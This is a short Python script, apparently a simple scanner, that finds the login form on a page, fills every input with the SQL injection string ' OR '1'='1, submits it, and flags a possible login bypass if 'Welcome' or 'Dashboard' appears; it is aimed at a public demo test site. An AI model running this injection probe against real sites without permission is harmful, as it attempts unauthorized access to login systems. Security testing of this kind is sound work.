import requests
from bs4 import BeautifulSoup

def check_sqli_login(url):
    session = requests.Session()
    
    try:
        response = session.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            print("No login form detected.")
            return
        
        action = form.get('action') or url
        method = form.get('method', 'post').lower()
        inputs = {inp.get('name'): "' OR '1'='1" for inp in form.find_all('input') if inp.get('name')}
        
        if not inputs:
            print("No input fields detected.")
            return
        
        target_url = action if action.startswith("http") else url + action
        
        if method == 'post':
            response = session.post(target_url, data=inputs, timeout=5)
        else:
            response = session.get(target_url, params=inputs, timeout=5)
        
        if "Welcome" in response.text or "Dashboard" in response.text:
            print(f"Potential SQL Injection vulnerability found at {target_url}")
        else:
            print("No SQL Injection vulnerability detected.")
    except requests.exceptions.RequestException as e:
        print(f"Error checking {url}: {e}")

def main():
    url = "https://demo.testfire.net/login.jsp"
    check_sqli_login(url)

if __name__ == "__main__":
    main()
